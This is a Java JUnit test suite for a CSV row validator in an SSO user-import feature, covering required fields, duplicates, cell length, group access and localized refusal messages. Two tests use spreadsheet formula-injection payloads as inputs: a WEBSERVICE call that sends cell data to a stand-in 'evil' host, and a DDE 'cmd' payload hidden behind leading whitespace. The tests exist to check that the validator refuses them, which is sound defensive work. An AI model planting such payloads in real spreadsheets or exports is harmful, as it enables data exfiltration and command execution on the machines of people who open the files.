package com.example.sso.metadata.internal.application;

import com.example.sso.metadata.AttributeDefinition;
import com.example.sso.metadata.CsvRowFailure;
import com.example.sso.metadata.ProfileAttributeValidator;
import com.example.sso.shared.error.BadRequestException;
import com.example.sso.user.account.BaseUserFields;
import java.util.Collection;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.ArgumentCaptor;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.context.MessageSource;
import org.springframework.context.i18n.LocaleContextHolder;
import org.springframework.context.support.ResourceBundleMessageSource;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyList;
import static org.mockito.Mockito.doThrow;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;

/**
 * Whether one row may be applied — the security refusals an import makes per row.
 *
 * <p>Everything here RETURNS rather than throws, which is the whole contract that separates this class from
 * {@link CsvFileReader}: a wrong VALUE costs its own row, a wrong SHAPE costs the file. A test that let one of
 * these throw would be describing the other class.
 *
 * <p>Failures are asserted against the message resolved from the KEY rather than against English prose, so
 * rewording a bundle entry does not fail the suite but returning the WRONG refusal does — two refusals reading
 * the same sentence is exactly the mix-up worth catching.
 */
@ExtendWith(MockitoExtension.class)
class CsvRowValidatorTest {

    private static final int MAX_CELL = 255;
    private static final Set<String> BASE_KEYS = Set.of(BaseUserFields.USERNAME, BaseUserFields.EMAIL);

    @Mock private ProfileAttributeValidator values;

    private static MessageSource bundle() {
        ResourceBundleMessageSource source = new ResourceBundleMessageSource();
        source.setBasename("messages");
        source.setDefaultEncoding("UTF-8");
        return source;
    }

    private CsvRowValidator validator() {
        return new CsvRowValidator(values, new CsvFailureText(bundle()),
                new CsvImportLimits(2_097_152, 100, 20, MAX_CELL));
    }

    private CsvRowFailure failureIn(CsvRow row) {
        return validator().failureIn(List.of(), row, Set.of(), Set.of());
    }

    /**
     * What the given key and arguments read as, so a test names the refusal rather than its wording.
     *
     * <p>Resolved through the SAME locale the validator will use, not a pinned one: the reason is a sentence
     * for an administrator, and pinning English here would pass only on an English-defaulted JVM.
     */
    private String reads(String messageKey, Object... args) {
        return bundle().getMessage(messageKey, args, LocaleContextHolder.getLocale());
    }

    private CsvRow row(Map<String, String> attributes, List<String> groups, boolean oversizedGroups) {
        return new CsvRow(7, attributes.getOrDefault(BaseUserFields.USERNAME, ""), attributes, BASE_KEYS,
                groups, oversizedGroups);
    }

    private CsvRow rowOf(String username, String email) {
        Map<String, String> attributes = new LinkedHashMap<>();
        attributes.put(BaseUserFields.USERNAME, username);
        attributes.put(BaseUserFields.EMAIL, email);
        return row(attributes, List.of(), false);
    }

    private CsvRow rowWith(String key, String value) {
        Map<String, String> attributes = new LinkedHashMap<>();
        attributes.put(BaseUserFields.USERNAME, "ada");
        attributes.put(BaseUserFields.EMAIL, "ada@x.io");
        attributes.put(key, value);
        return row(attributes, List.of(), false);
    }

    @AfterEach
    void clearLocale() {
        LocaleContextHolder.resetLocaleContext();
    }

    /**
     * A row failure travels in a normal response body, not through the exception handler, so nothing on the
     * way out would otherwise translate it — the console printed {@code metadata.csv.row.missingRequired} at
     * a person. Asserted against both bundles, because resolving to the key would satisfy neither.
     */
    @Test
    void theReasonIsWrittenInTheAdministratorsOwnLanguage() {
        LocaleContextHolder.setLocale(Locale.KOREAN);
        String korean = failureIn(rowOf("", "ada@x.io")).reason();

        LocaleContextHolder.setLocale(Locale.ENGLISH);
        String english = failureIn(rowOf("", "ada@x.io")).reason();

        assertThat(korean).isEqualTo("username은(는) 필수입니다.");
        assertThat(english).isEqualTo("username is required.");
    }

    @Test
    void aCompleteRowMayBeApplied() {
        assertThat(failureIn(rowOf("ada", "ada@x.io"))).isNull();
    }

    @Test
    void theFailureCarriesTheLineOfTheFileTheRowCameFrom() {
        assertThat(failureIn(rowOf("", "ada@x.io")).line()).isEqualTo(7);
    }

    @Test
    void aRowWithNoUsernameIsRefused() {
        assertThat(failureIn(rowOf("", "ada@x.io")).reason())
                .isEqualTo(reads("metadata.csv.row.missingRequired", BaseUserFields.USERNAME));
    }

    /**
     * {@code app_user.email} is NOT NULL and "" collides with itself under the per-org unique index, so a file
     * with no addresses would create ONE account and call every later row a duplicate.
     */
    @Test
    void aRowWithNoEmailIsRefused() {
        assertThat(failureIn(rowOf("ada", "")).reason())
                .isEqualTo(reads("metadata.csv.row.missingRequired", BaseUserFields.EMAIL));
    }

    @Test
    void aUsernameAlreadyTakenByAnEarlierRowOfTheSameFileIsRefused() {
        CsvRowFailure failure = validator()
                .failureIn(List.of(), rowOf("ada", "ada@x.io"), Set.of("ada"), Set.of());

        assertThat(failure.reason()).isEqualTo(reads("metadata.csv.row.duplicateUsername", "ada"));
    }

    /**
     * The accepted set is a PARAMETER, not a field. A field would be shared between concurrent imports, so two
     * administrators uploading at once would poison each other's duplicate detection.
     */
    @Test
    void judgingARowDoesNotRecordItAsSeen() {
        Set<String> seen = new LinkedHashSet<>();

        validator().failureIn(List.of(), rowOf("ada", "ada@x.io"), seen, Set.of());

        assertThat(seen).isEmpty();
    }

    @Test
    void aCellLongerThanTheColumnItIsStoredInIsRefused() {
        assertThat(failureIn(rowWith("team", "x".repeat(MAX_CELL + 1))).reason())
                .isEqualTo(reads("metadata.csv.row.valueTooLong", "team"));
    }

    @Test
    void aCellOfExactlyTheCeilingIsAccepted() {
        assertThat(failureIn(rowWith("team", "x".repeat(MAX_CELL)))).isNull();
    }

    /**
     * The groups cell is measured BEFORE it is split — it is the one column that fans out — so the row carries
     * the verdict rather than a value the per-cell ceiling could still check.
     */
    @Test
    void anOversizedGroupsCellIsRefusedEvenThoughItWasNeverSplit() {
        CsvRow row = row(Map.of(BaseUserFields.USERNAME, "ada", BaseUserFields.EMAIL, "ada@x.io"),
                List.of(), true);

        assertThat(failureIn(row).reason()).isEqualTo(reads("metadata.csv.row.valueTooLong", "groups"));
    }

    /** Refused, not neutralised: stored values are re-exported, and a name opening like a formula is never real. */
    @Test
    void aCellThatOpensLikeASpreadsheetFormulaIsRefused() {
        assertThat(failureIn(rowWith("team", "=WEBSERVICE(\"http://evil/\"&A1)")).reason())
                .isEqualTo(reads("metadata.csv.row.formulaValue", "team"));
    }

    /** Google Sheets trims before deciding, so a first-character check would be a one-space bypass. */
    @Test
    void aFormulaHiddenBehindLeadingWhitespaceIsStillRefused() {
        assertThat(failureIn(rowWith("team", "   =cmd|'/c calc'!A1")).reason())
                .isEqualTo(reads("metadata.csv.row.formulaValue", "team"));
    }

    @Test
    void anOrdinaryValueBeginningWithALetterIsNotMistakenForAFormula() {
        assertThat(failureIn(rowWith("team", "platform"))).isNull();
    }

    /**
     * "Unusable" covers both "no such group" and "not one you may use", refused identically — telling them
     * apart would let a delegate map which groups exist outside their own subtree.
     */
    @Test
    void aRowNamingAGroupTheActorCannotUseIsRefused() {
        CsvRow row = row(Map.of(BaseUserFields.USERNAME, "ada", BaseUserFields.EMAIL, "ada@x.io"),
                List.of("platform", "secret-ops"), false);

        CsvRowFailure failure = validator().failureIn(List.of(), row, Set.of(), Set.of("secret-ops"));

        assertThat(failure.reason()).isEqualTo(reads("metadata.csv.row.unknownGroup", "secret-ops"));
    }

    @Test
    void aRowNamingOnlyUsableGroupsIsAccepted() {
        CsvRow row = row(Map.of(BaseUserFields.USERNAME, "ada", BaseUserFields.EMAIL, "ada@x.io"),
                List.of("platform"), false);

        assertThat(validator().failureIn(List.of(), row, Set.of(), Set.of("secret-ops"))).isNull();
    }

    /**
     * The profile's own rules are the same ones that guard a manually created user, so a rule cannot hold on
     * the console path and not on the bulk one — and its refusal becomes the row's reported reason.
     */
    @Test
    void aValueTheProfileRefusesBecomesTheRowsReason() {
        doThrow(BadRequestException.of("metadata.attribute.undeclared", "team"))
                .when(values).validate(anyList(), any());

        assertThat(failureIn(rowWith("team", "nope")).reason())
                .isEqualTo(reads("metadata.attribute.undeclared", "team"));
    }

    /**
     * Base keys are app_user COLUMNS, which the profile validator refuses by name. Handing it the whole row
     * failed every line of every real import with "undeclared: username".
     */
    @Test
    void theAccountsOwnColumnsAreNotOfferedToTheProfileValidator() {
        failureIn(rowWith("team", "platform"));

        ArgumentCaptor<Map<String, ? extends Collection<String>>> offered = ArgumentCaptor.captor();
        verify(values).validate(anyList(), offered.capture());
        assertThat(offered.getValue()).containsOnlyKeys("team");
    }

    /** A row already refused is not worth a profile lookup, and must not be reported twice. */
    @Test
    void aRowRefusedOnItsOwnRulesNeverReachesTheProfileValidator() {
        failureIn(rowOf("", "ada@x.io"));

        verify(values, never()).validate(anyList(), any());
    }

    /** Definitions do not change between rows, so the planner resolves them once and passes them through. */
    @Test
    void theProfileColumnsTheCallerResolvedAreTheOnesValidatedAgainst() {
        List<AttributeDefinition> columns = List.of();

        validator().failureIn(columns, rowWith("team", "platform"), Set.of(), Set.of());

        verify(values).validate(columns, Map.of("team", List.of("platform")));
    }
}
